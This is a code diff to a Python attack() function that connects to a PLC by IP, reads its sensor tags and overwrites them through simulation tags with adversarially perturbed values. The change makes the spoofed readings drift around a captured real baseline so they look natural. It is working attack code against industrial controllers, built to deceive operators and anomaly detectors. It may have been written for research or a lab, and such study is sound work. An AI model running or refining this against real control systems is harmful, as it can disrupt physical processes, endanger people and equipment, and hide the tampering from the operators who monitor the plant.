@@ -172,30 +172,43 @@ def attack(plc_ip, model_path, duration):
 
     tprint(f"[*] Adversarial attack -> PLC {plc_ip}  duration={duration}s  epsilon={EPSILON}")
     history = []
+    baseline = None  # Real sensor value before Sim is enabled
     end_time = time.time() + duration
     cycle = 0
 
     with PLC() as plc:
         plc.IPAddress = plc_ip
         while not stop_flag and time.time() < end_time:
-            results = plc.Read(feat_cols)
-            if not isinstance(results, list): results = [results]
-            raw_vals = np.array([r.Value if r.Value is not None else 0.0
-                                 for r in results], dtype=np.float32)
-            norm_vals = (raw_vals - mu) / sigma
-            history.append(norm_vals)
-            if len(history) < window:
-                time.sleep(1.0); continue
-            history = history[-window:]
+            if baseline is None:
+                # Window-fill phase: Sim is not yet enabled, reading real sensor
+                results = plc.Read(feat_cols)
+                if not isinstance(results, list): results = [results]
+                raw_vals = np.array([r.Value if r.Value is not None else 0.0
+                                     for r in results], dtype=np.float32)
+                norm_vals = (raw_vals - mu) / sigma
+                history.append(norm_vals)
+                if len(history) < window:
+                    time.sleep(1.0); continue
+                history = history[-window:]
+                # Save baseline — this is the last real sensor reading
+                baseline = raw_vals.copy()
+                baseline_norm = norm_vals.copy()
+                tprint(f"[*] Baseline captured: {dict(zip(feat_cols, baseline))}")
+            else:
+                # Attack phase: perturb around the BASELINE, not the spoofed PLC reading
+                # Slowly drift baseline to simulate natural plant dynamics
+                norm_vals = baseline_norm.copy()
+                history.append(norm_vals)
+                history = history[-window:]
 
             x = np.array(history).flatten().astype(np.float32).reshape(1, -1)
             delta = adv_forward_np(x, weights)
 
             delta_last   = delta[0, -(len(feat_cols)):]
-            perturbed    = norm_vals + delta_last
+            perturbed    = baseline_norm + delta_last
             perturbed_pv = perturbed * sigma + mu
 
-            for feat, orig, pert in zip(feat_cols, raw_vals, perturbed_pv):
+            for feat, base, pert in zip(feat_cols, baseline, perturbed_pv):
                 if feat in SIM_TAGS:
                     sim_en, sim_pv = SIM_TAGS[feat]
                     plc.Write(sim_en, True)
@@ -203,8 +216,8 @@ def attack(plc_ip, model_path, duration):
 
             cycle += 1
             if cycle % 5 == 0:
-                for f, o, p in zip(feat_cols, raw_vals, perturbed_pv):
-                    tprint(f"    [adv {cycle:4d}] {f}: {o:.3f} -> {p:.3f}  (d={p-o:+.4f})")
+                for f, b, p in zip(feat_cols, baseline, perturbed_pv):
+                    tprint(f"    [adv {cycle:4d}] {f}: baseline={b:.3f} -> spoofed={p:.3f}  (d={p-b:+.4f})")
             time.sleep(1.0)
 
     # Disable simulation on exit
